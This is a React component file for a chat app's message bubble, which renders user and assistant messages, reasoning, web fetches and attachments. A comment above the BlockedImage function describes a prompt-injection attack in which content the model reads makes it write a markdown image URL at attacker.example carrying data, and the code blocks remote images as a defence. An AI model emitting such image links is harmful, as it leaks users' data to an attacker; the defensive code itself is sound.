import Markdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { Button, cn } from "@app/ui";
import { Bot, Paperclip, Square, User } from "lucide-react";
import type { Message } from "../../../shared/types";
import { MessageError } from "./MessageError";
import { ReasoningSection } from "./ReasoningSection";
import { WebFetchList } from "./WebFetchList";

export interface MessageBubbleProps {
  message: Message;
  /** When set, user messages written by someone else are labeled with their email. */
  currentUserId?: string;
  onStop?: (messageId: string) => void;
  onRetry?: (messageId: string) => void;
  retrying?: boolean;
  /** Show the model's reasoning above assistant replies that have any (default: shown). */
  showReasoning?: boolean;
}

/**
 * A reply is untrusted text: a page or a file the model read can make it write `![x](https://attacker.example/?d=...)`, and
 * the browser would then load that image by itself and send the URL, with whatever the model put in it, to the attacker
 * (AICHAT-26, finding F3). Remote images are therefore not loaded; the alt text is shown instead.
 */
function BlockedImage({ alt }: { alt?: string }) {
  return (
    <span data-testid="blocked-image" title="Remote images in replies are not loaded" className="italic text-muted-foreground">
      [image not loaded{alt ? `: ${alt}` : ""}]
    </span>
  );
}

/** AC-52 (incremental content), AC-54 (stop), AC-57 (distinct queued state), AC-72/73 (error + retry). */
export function MessageBubble({ message, currentUserId, onStop, onRetry, retrying, showReasoning = true }: MessageBubbleProps) {
  const isOtherMember =
    message.role === "user" && Boolean(currentUserId && message.authorId && message.authorId !== currentUserId);
  const isUser = message.role === "user" && !isOtherMember;
  const streaming = message.status === "streaming";
  const reasoning = message.role === "assistant" && showReasoning ? message.reasoning : null;
  const webFetches = message.role === "assistant" ? (message.webFetches ?? []) : [];

  return (
    <li
      data-testid={`${message.role}-message`}
      data-message-id={message.id}
      data-status={message.status}
      className={cn("flex gap-3", isUser && "justify-end")}
    >
      {isOtherMember ? (
        <span className="mt-0.5 flex size-7 shrink-0 items-center justify-center rounded-full bg-muted">
          <User className="size-4 text-muted-foreground" aria-hidden="true" />
        </span>
      ) : !isUser ? (
        <span className="mt-0.5 flex size-7 shrink-0 items-center justify-center rounded-full border border-border bg-background">
          <Bot className="size-4 text-muted-foreground" aria-hidden="true" />
        </span>
      ) : null}

      <div
        className={cn(
          "flex min-w-0 flex-col gap-2",
          isUser ? "max-w-[85%] items-end" : isOtherMember ? "max-w-[85%] items-start" : "flex-1"
        )}
      >
        {isOtherMember ? (
          <>
            <span className="text-xs font-medium text-muted-foreground">{message.authorEmail ?? "Another member"}</span>
            <div className="whitespace-pre-wrap break-words rounded-2xl rounded-tl-sm bg-muted px-4 py-2 text-sm leading-relaxed">
              {message.content}
            </div>
          </>
        ) : isUser ? (
          <div className="whitespace-pre-wrap break-words rounded-2xl rounded-br-sm bg-primary px-4 py-2 text-sm leading-relaxed text-primary-foreground">
            {message.content}
          </div>
        ) : null}

        {reasoning ? <ReasoningSection reasoning={reasoning} thinking={streaming && !message.content} /> : null}

        {webFetches.length > 0 ? <WebFetchList fetches={webFetches} /> : null}

        {isOtherMember || isUser ? null : message.content ? (
          // Assistant replies are markdown; shadcn Typeset styles the rendered prose.
          <div data-testid="assistant-reply" className="typeset typeset-chat min-w-0">
            <Markdown remarkPlugins={[remarkGfm]} components={{ img: BlockedImage }}>{message.content}</Markdown>
          </div>
        ) : streaming && !reasoning && webFetches.length === 0 ? (
          <span className="flex h-6 items-center gap-1" aria-hidden="true">
            <span className="size-1.5 animate-pulse rounded-full bg-muted-foreground" />
            <span className="size-1.5 animate-pulse rounded-full bg-muted-foreground [animation-delay:150ms]" />
            <span className="size-1.5 animate-pulse rounded-full bg-muted-foreground [animation-delay:300ms]" />
          </span>
        ) : null}

        {message.attachments.length > 0 ? (
          <ul aria-label="Message attachments" className="flex flex-wrap gap-1.5">
            {message.attachments.map((attachment) => (
              <li
                key={attachment.id}
                className="flex items-center gap-1 rounded-md border border-border bg-muted/50 px-2 py-1 text-xs text-muted-foreground"
              >
                <Paperclip className="size-3" aria-hidden="true" />
                {attachment.filename}
              </li>
            ))}
          </ul>
        ) : null}

        {streaming ? (
          <div className="flex items-center gap-2">
            <span role="status" aria-label="Generating response" className="text-xs text-muted-foreground">
              Generating…
            </span>
            {onStop ? (
              <Button type="button" variant="outline" size="sm" className="h-7 px-2 text-xs" onClick={() => onStop(message.id)}>
                <Square className="size-3 fill-current" aria-hidden="true" />
                Stop
              </Button>
            ) : null}
          </div>
        ) : null}

        {onRetry && <MessageError message={message} onRetry={onRetry} retrying={retrying} />}
      </div>
    </li>
  );
}
